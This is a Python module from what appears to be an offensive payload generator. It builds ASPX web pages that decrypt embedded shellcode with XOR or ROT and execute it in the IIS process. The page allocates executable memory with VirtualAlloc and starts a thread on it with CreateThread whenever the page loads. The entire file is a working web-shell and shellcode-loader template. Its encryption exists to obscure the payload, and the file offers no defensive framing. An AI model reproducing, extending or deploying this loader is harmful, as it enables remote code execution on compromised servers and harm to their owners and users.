"""
ASPX web-payload generator.

Constraints:
  - Only XOR and ROT encryption are supported (lightweight, no assembly deps).
  - Injection method: VirtualAlloc in-process (simplest for web context).
  - Executes via Page_Load.
"""

from ..chain import decryption_stubs_cs


def generate(encrypted_bytes: bytes, chain_metadata: list[dict]) -> str:
    """
    Build an ASPX file that decrypts and executes shellcode via Page_Load.

    Raises:
        ValueError: If chain contains AES or RC4 (unsupported for ASPX).
    """
    for stage in chain_metadata:
        if stage['algo'] in ('aes256', 'rc4'):
            raise ValueError(
                f"Algorithm '{stage['algo']}' is not supported for ASPX output. "
                "ASPX supports XOR and ROT only."
            )

    sc_hex = '{ ' + ', '.join(f'0x{b:02x}' for b in encrypted_bytes) + ' }'
    helper_methods, call_seq = decryption_stubs_cs(chain_metadata)

    return _TEMPLATE.format(
        sc_hex=sc_hex,
        helper_methods=helper_methods,
        call_seq=call_seq,
    )


_TEMPLATE = """\
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Runtime.InteropServices" %>
<script runat="server">

    [System.Runtime.InteropServices.DllImport("kernel32.dll")]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
                                      uint flAllocationType, uint flProtect);

    [System.Runtime.InteropServices.DllImport("kernel32.dll")]
    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,
                                      IntPtr lpStartAddress, IntPtr lpParameter,
                                      uint dwCreationFlags, IntPtr lpThreadId);

    [System.Runtime.InteropServices.DllImport("kernel32.dll")]
    static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

{helper_methods}

    protected void Page_Load(object sender, EventArgs e)
    {{
        byte[] encrypted = new byte[] {sc_hex};
        byte[] buf = (byte[])encrypted.Clone();
        {call_seq}

        IntPtr ptr = VirtualAlloc(IntPtr.Zero, (uint)buf.Length, 0x3000, 0x40);
        System.Runtime.InteropServices.Marshal.Copy(buf, 0, ptr, buf.Length);
        IntPtr hThread = CreateThread(IntPtr.Zero, 0, ptr, IntPtr.Zero, 0, IntPtr.Zero);
        WaitForSingleObject(hThread, 0xFFFFFFFF);
    }}
</script>
<html><body></body></html>
"""
